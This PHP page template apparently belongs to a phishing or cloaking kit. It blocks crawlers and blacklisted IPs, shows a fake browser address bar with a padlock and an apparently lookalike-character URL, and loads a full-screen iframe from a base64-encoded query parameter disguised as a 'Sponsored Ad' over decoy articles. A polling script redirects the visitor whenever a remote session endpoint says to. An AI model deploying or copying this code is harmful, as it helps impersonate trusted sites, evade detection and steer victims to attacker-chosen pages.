<?php

use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Vectorface\Whip\Whip;

session_start();
require_once './config/config.php';

require BASE_PATH . '/src/config.php';

$CrawlerDetect = new CrawlerDetect;

// Check the user agent of the current 'visitor'
if ($CrawlerDetect->isCrawler()) {
	// true if crawler user agent detected
	http_response_code(403);
	die();
}

$whip = new Whip();
$clientAddress = $whip->getValidIpAddress();

// Open a database connection
$pdo = new PDO('sqlite:' . BASE_PATH . '/data/db/blacklist.db');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Create the 'blacklist' table if it doesn't exist
$pdo->exec("CREATE TABLE IF NOT EXISTS blacklist (
    ip_address TEXT PRIMARY KEY,
    blocked_at TEXT
)");

// Check if the visitor's IP is blacklisted
$stmt = $pdo->prepare("SELECT * FROM blacklist WHERE ip_address = :ip");
$stmt->execute(['ip' => $_SERVER['REMOTE_ADDR']]);
if ($stmt->fetch()) {
	http_response_code(403);
	die();
}
?>
<!doctype html>
<html lang="en">

<head>
	<!-- Required meta tags -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<?php if (EMBED === true) { ?>
		<meta name="description" content="<?php echo getCyrillicAlphabet($description ?? null, false); ?>">
	<?php } ?>

	<!-- Bootstrap CSS -->
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css?<?php echo uniqid(); ?>" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css?<?php echo uniqid(); ?>" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" referrerpolicy="no-referrer" />

	<?php if (EMBED === true) { ?>
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css?<?php echo uniqid(); ?>">
	<?php } ?>

	<link rel="shortcut icon" href="<?php echo $favicon ?? null; ?>">

	<?php if (EMBED === true) { ?>
		<title><?php echo getCyrillicAlphabet($title ?? null, false); ?></title>
	<?php } ?>

	<?php if (EMBED === true) { ?>
		<style type="text/css">
			.pace .pace-progress {
				background: <?php echo $color; ?>;
				top: 57px;
				height: 5px;
			}
			
			body.header-hidden .pace {
				display: none;
			}

			body {
				overflow: hidden;
			}

			body>header {
				width: 100%;
				display: flex;
				align-items: stretch;
				justify-content: center;
				position: relative;
				z-index: 9999;
			}

			body>header span {
				z-index: 9999;
				transform: translateY(-50%);
				font-size: 1.2em;
			}

			body>header span:first-child {
				left: 0;
			}

			body>header span:last-child {
				right: 0;
			}

			body>header input {
				flex-grow: 1;
				border: none;
				text-overflow: ellipsis;
				padding: 0.5rem;
				padding-left: calc(24px + 0.75rem);
				padding-right: calc(24px + 0.75rem);
			}

			body.header-hidden>header {
				display: none;
			}

			main:after {
				content: "";
				background: #ffffff;
				position: absolute;
				top: 0;
				left: 0;
				bottom: 0;
				right: 0;
			}

			aside {
				top: 57px;
				height: calc(100vh - 57px);
			}
			
			body.header-hidden aside {
				top: 0;
				height: 100vh;
			}

			aside>iframe {
				height: calc(100vh - 57px);
				z-index: 9999;
			}
			
			body.header-hidden aside>iframe {
				height: 100vh;
			}
		</style>
	<?php } ?>

	<?php if (GOOGLE_ANALYTICS_PROPERTY_ID) { ?>
		<!-- Google tag (gtag.js) -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=<?php echo GOOGLE_ANALYTICS_PROPERTY_ID; ?>"></script>
		<script>
			window.dataLayer = window.dataLayer || [];

			function gtag() {
				dataLayer.push(arguments);
			}
			gtag('js', new Date());

			gtag('config', '<?php echo GOOGLE_ANALYTICS_PROPERTY_ID; ?>');
		</script>
	<?php } ?>
</head>

<body class="vh-100 header-hidden">
	<?php if (EMBED === true) { ?>
		<header class="bg-light border-bottom p-2">
			<!-- Search icon -->
			<span class="position-absolute top-50 text-muted ms-3">
				<i class="fa-solid fa-lock fa-fw"></i>
			</span>
			<!-- Search input -->
			<input class="rounded-pill" id="url" title="<?php echo getCyrillicAlphabet($url ?? null, true); ?>" value="<?php echo getCyrillicAlphabet($url ?? null, true); ?>" readonly="">
			<!-- Search button -->
			<span class="position-absolute top-50 text-muted me-3">
				<i class="fa-regular fa-star fa-fw"></i>
			</span>
		</header>
	<?php } ?>

	<main>
		<?php
		// Read the JSON file and parse its contents
		$articlesJson = file_get_contents(BASE_PATH . '/data/json/articles.json');
		$articles = json_decode($articlesJson, true);
		shuffle($articles);
		?>
		<?php foreach ($articles as $article) { ?>
			<article>
				<header>
					<a href="/<?php echo strtolower(trim(preg_replace('/[^A-Za-z0-9-]+/', '-', $article['title']), '-')); ?>">
						<h2><?php echo $article['title']; ?></h2>
					</a>
				</header>
				<?php echo $article['body']; ?>
			</article>
		<?php } ?>
	</main>

	<?php if (EMBED === true) { ?>
		<aside class="d-block vw-100 position-fixed">
			<h1>Sponsored Ad</h1>
			<iframe class="position-absolute top-0 bg-white d-block vw-100" src="<?php echo base64_decode($_GET['url']); ?>" frameborder="0"></iframe>
		</aside>
	<?php } ?>

	<!-- Optional JavaScript; choose one of the two! -->

	<!-- Option 1: Bootstrap Bundle with Popper -->
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>

	<!-- Option 2: Separate Popper and Bootstrap JS -->
	<!--
		<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
		-->

	<?php if (EMBED === true) { ?>
		<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js?<?php echo uniqid(); ?>"></script>
	<?php } ?>

	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js?<?php echo uniqid(); ?>" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

	<?php if (EMBED === true) { ?>
		<script>
			var eventMethod = window.addEventListener ?
				"addEventListener" :
				"attachEvent";
			var eventer = window[eventMethod];
			var messageEvent = eventMethod === "attachEvent" ?
				"onmessage" :
				"message";

			Pace.options = {
				ajax: false
			};

			eventer(messageEvent, function(e) {
				if (e.data === "beforeunload" || e.message === "beforeunload") {
					setTimeout(() => {
						Pace.stop();
						Pace.bar.render();
						Pace.start({
							ghostTime: 60000,
						});
					}, "400");
				} else if (e.data === "load" || e.message === "load") {
					setTimeout(() => {
						Pace.stop();
						Pace.bar.render();
					}, "1000");
				}
			});
		</script>

		<script>
			Pace.ignore(function() {
				var checkInterval = setInterval(function() {
					var xhr = new XMLHttpRequest();
					xhr.open('GET', '<?php echo SESSION_URL . '/session.php?session_id=' . session_id(); ?>', true);
					xhr.onload = function() {
						if (xhr.status === 200) {
							var response = JSON.parse(xhr.responseText);
							if (response.redirect === true) {
								var updateXhr = new XMLHttpRequest();
								updateXhr.open('GET', '<?php echo ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . '/' . APP_PATH . '/callback.php?session_id=' . session_id() . '&redirect=false&url='; ?>', true);
								updateXhr.onload = function() {
									if (updateXhr.status === 200) {
										window.location = atob(response.url);
									} else {
										console.error('Failed to update session: ' + updateXhr.status);
									}
								};
								updateXhr.send();
							}
						} else {
							console.error('Session check failed: ' + xhr.status);
						}
					};
					xhr.send();
				}, 3000); // Checks every second
			});
		</script>
	<?php } ?>
</body>

</html>